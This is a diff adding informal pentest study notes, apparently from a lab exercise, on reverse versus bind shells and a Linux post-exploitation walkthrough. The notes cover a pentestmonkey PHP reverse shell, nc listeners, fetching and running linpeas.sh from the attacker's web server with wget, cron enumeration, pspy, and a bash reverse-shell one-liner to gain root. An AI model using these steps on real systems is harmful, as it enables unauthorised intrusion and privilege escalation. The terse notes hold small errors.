@@ -1,0 +1,73 @@
+## Reverse shell vs Bind shell
+Reverse shell 
+A victim connects to us 
+
+
+for linux we type -e /bin/sh 
+for windows we type -e command.exe/cmd.exe 
+95% times is used 
+
+
+
+Bind Shell 
+
+
+Where we send the payload, open the port and then we connect to machine 
+
+
+ 
+To upload the Shell 
+php reverse shell  
+1st github link pentestmonkey  download php_reverse_shell.py 
+gedit shell.php 
+copy paste 
+change IP 
+set listner 
+nc -nvlp 4444 
+
+we got the shell uploaded but not root user 
+whoami 
+hostname 
+locate 
+ls 
+
+so now we going to download Linpeas.sh  
+
+Now we're going to host the web server by 
+python3 -m http.server 80 
+
+now we need to download this linpeas.sh in machine so we're going to download at 
+cd /tmp 
+pwd 
+/tmp 
+wget http://mymachineIP/linpeas.sh 
+chmod 777 linpeas.sh 
+./linpeas.sh 
+
+now watchout for LEGEND 
+
+ssh grimmie(admin user)@IPofvictimMac 
+paste the machine 
+
+google cronjob (learn)
+crontab -l 
+crontab -u root -l 
+crontab -e 
+systemctl list-timers  
+
+download pspy64 bit static version 
+download in victim machine change the permission and run 
+
+Google bash reverse shell one liner 
+reverse shell cheat sheet pentestmonkey 
+copy the code for bash change the IP, give your ip and port whatever 
+nc -nvlp 8081 
+got the machine 
+whoami 
+hostname 
+hashdump 
+ls 
+help 
+ 
+
+
